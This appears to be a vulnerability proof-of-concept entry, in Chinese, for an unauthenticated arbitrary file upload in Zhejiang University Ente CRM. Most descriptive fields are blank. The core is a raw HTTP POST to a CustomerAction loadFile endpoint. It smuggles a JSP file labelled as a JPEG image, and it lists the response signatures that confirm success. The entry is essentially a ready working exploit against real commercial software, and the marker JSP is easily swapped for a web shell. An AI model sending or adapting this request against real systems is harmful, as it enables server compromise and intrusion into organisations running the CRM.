﻿# 浙大恩特CRM全版本前台任意文件上传

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="dudesuite.jsp"
Content-Type: image/jpeg

<%out.print("dudesuite");%>
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```

> 响应代码特征：200

> 响应内容特征：dudesuite.jsp

> 上传文件定位：

> 验证文件来源：浙大恩特CRM全版本前台任意文件上传.poc
